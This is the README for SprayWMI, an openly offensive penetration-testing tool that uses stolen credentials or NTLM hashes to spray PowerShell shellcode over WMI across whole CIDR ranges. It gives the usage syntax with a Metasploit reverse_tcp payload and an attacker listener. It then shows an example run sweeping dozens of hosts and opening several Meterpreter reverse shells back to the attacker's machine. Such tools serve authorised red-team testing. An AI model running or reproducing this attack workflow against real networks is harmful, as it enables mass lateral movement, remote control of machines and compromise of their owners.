SprayWMI is a method for mass spraying unicorn powershell injection to CIDR notations.

Written by David Kennedy @TrustedSec
Special thanks: Justin Elze and Larry Spohn

Initial Blog: https://www.trustedsec.com/june-2015/no_psexec_needed/
if you have trouble with this on 64 bit - try:
dpkg --add-architecture i386 && apt-get update && apt-get install libpam0g:i386 && apt-get install libpopt0:i386

Flag descriptions:

DOMAIN - domain you are attacking - if its local, just specify workgroup

USERNAME - username to authenticate on the remote Windows system
PASSWORD - password or password hash lm:ntlm to use on the remote Windows system
CIDR_RANGE,CIDR_RANGE or ips.txt - you can specify a single ip, a CIDR range (192.168.1.1/24) or multiple CIDRs such as 192.168.1.1/24,192.168.2.1/24. You can also specify a file (ex: file.txt) which has single IP addresses on a new line. 
METASPLOIT_PAYLOAD - this is the payload you want to use example: windows/meterpreter/reverse_tcp
REVERSE_SHELL_IP - this is the IP address of your attacker machine that you want to create a listener or use an already established listener
REVERSE_SHELL_PORT - port to connect back on for the reverse
OPTIONAL: NO - specify no if you do not want to create a listener - this is useful if you already have a listener established. If you do not specify a value here, it will automatically create a listener for you.

Usage: python spraywmi.py <domain> <username> <password or hash lm:ntlm> <cidr_range,cidr_range or ips.txt> <metasploit_payload> <reverse_shell_ip> <reverse_shell_port> <optional: no>

Below is an example of output from spraywmi:

root@stronghold:/home/relik# python spraywmi.py TS kennedy-test complexP255w0rd! 192.168.90.1/24,192.168.0.1/24,192.168.59.1/24,192.168.96.1/24,192.168.1.1/24 windows/meterpreter/reverse_tcp 192.168.47.24 443
[*] Generating shellcode through unicorn, could take a few seconds...
[*] Launching the listener in the background...
[*] Waiting for the listener to start first before we continue forward...
[*] Be patient, Metaploit takes a little bit to start...
[*] Sweeping network for ports that are open first, then moving through... Be patient.
[*] Launching WMI spray against IP: 192.168.90.1 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.2 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.7 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.11 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.14 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.16 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.18 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.25 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.30 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.37 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.38 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.39 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.41 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.46 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.52 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.53 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.54 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.55 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.58 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.63 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.64 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.101 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.102 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.106 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.107 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.113 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.119 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.151 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.158 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.159 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.171 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.174 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.175 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.176 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.183 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.184 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.187 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.197 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.199 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.203 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.204 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.208 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.216 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.223 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.225 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.227 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.228 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.231 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.237 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.240 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.244 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.248 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.90.252 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.0.1 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.0.2 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.0.3 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.0.4 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.0.92 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.96.3 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.96.4 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.96.11 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.96.12 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.96.20 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.96.21 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.96.22 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.96.23 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.96.242 - you should have a shell in the background. Once finished, shell will spawn
[*] Launching WMI spray against IP: 192.168.1.13 - you should have a shell in the background. Once finished, shell will spawn
[*] Spraying is still happening in the background, shells should arrive as they complete.
[*] Interacting with Metasploit...
...
msf exploit(handler) > 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (885836 bytes) to 192.168.90.174
[*] Meterpreter session 1 opened (192.168.47.24:443 -> 192.168.90.174:49868) at 2015-10-13 04:33:55 -0400
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (885836 bytes) to 192.168.90.203
[*] Meterpreter session 2 opened (192.168.47.24:443 -> 192.168.90.203:51333) at 2015-10-13 04:33:59 -0400
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (885836 bytes) to 192.168.90.184
[*] Meterpreter session 3 opened (192.168.47.24:443 -> 192.168.90.184:61218) at 2015-10-13 04:34:02 -0400
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (885836 bytes) to 192.168.90.204
[*] Meterpreter session 4 opened (192.168.47.24:443 -> 192.168.90.204:54219) at 2015-10-13 04:34:06 -0400
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (885836 bytes) to 192.168.90.175
[*] Meterpreter session 5 opened (192.168.47.24:443 -> 192.168.90.175:54210) at 2015-10-13 04:34:10 -0400
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (885836 bytes) to 192.168.90.16
[*] Meterpreter session 6 opened (192.168.47.24:443 -> 192.168.90.16:56657) at 2015-10-13 04:34:14 -0400
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (885836 bytes) to 192.168.96.242
[*] Meterpreter session 7 opened (192.168.47.24:443 -> 192.168.96.242:49504) at 2015-10-13 04:34:18 -0400
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (885836 bytes) to 192.168.90.183
[*] Meterpreter session 8 opened (192.168.47.24:443 -> 192.168.90.183:56926) at 2015-10-13 04:34:28 -0400
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (885836 bytes) to 192.168.90.248
[*] Meterpreter session 9 opened (192.168.47.24:443 -> 192.168.90.248:53657) at 2015-10-13 04:34:31 -0400
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (885836 bytes) to 192.168.90.39
[*] Meterpreter session 10 opened (192.168.47.24:443 -> 192.168.90.39:60451) at 2015-10-13 04:34:35 -0400
[*] Encoded stage with x86/shikata_ga_nai
